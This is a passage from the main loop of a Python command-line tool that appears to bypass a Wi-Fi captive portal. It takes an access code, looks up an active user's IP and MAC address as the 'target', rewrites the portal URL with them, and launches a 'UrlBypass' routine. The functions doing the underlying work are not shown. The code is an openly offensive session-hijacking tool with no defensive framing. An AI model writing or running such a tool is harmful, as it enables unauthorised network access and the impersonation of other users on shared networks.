                    limited_code = input(f"{_c_}Enter new Limited Code (or press Enter to use saved): {_w_}").strip()
                else:
                    limited_code = input(f"{_c_}Enter Limited Code: {_w_}").strip()
                
                if not limited_code:
                    if saved_code and os.path.exists(saved_api_file):
                        limited_code = saved_code
                        api_url = open(saved_api_file, "r").read().strip()
                    else:
                        print(f"{_r_}[!] No saved API URL found. Please enter a new code!{_w_}")
                        time.sleep(1.5)
                        continue
                else:
                    open(saved_code_file, "w").write(limited_code)
                    print(f"{_c_}[*] Fetching target info...{_w_}")
                    target_ip, target_mac = get_target_info(limited_code)
                    if not target_ip or not target_mac:
                        print(f"{_r_}[!] No active user found for this code or network error!{_w_}")
                        time.sleep(1.5)
                        continue
                        
                    print(f"{_g_}[+] Target IP: {target_ip} | MAC: {target_mac}{_w_}")
                    print(f"{_c_}[*] Fetching Portal URL...{_w_}")
                    
                    portal_url = fetch_portal_url()
                    if not portal_url:
                        print(f"{_r_}[!] Failed to capture Portal URL!{_w_}")
                        time.sleep(1.5)
                        continue
                    
                    api_url = transform_portal_url(portal_url, target_ip, target_mac)
                    open(saved_api_file, "w").write(api_url)
                
                try:
                    bypass_obj = UrlBypass(api_url)
                    asyncio.run(bypass_obj.execute())
                except (Exception, KeyboardInterrupt, asyncio.CancelledError):
                    pass
                    
            elif choice == '0':
                sys.exit()
            else:
                print(f"{_r_}[!] Invalid choice!{_w_}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            continue
        except Exception as main_e:
            print(f"\n{_r_}[!] Unexpected Application Error: {str(main_e)}{_w_}")
            time.sleep(2)
            continue

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[!] Fatal Error: {str(e)}")
        sys.exit()
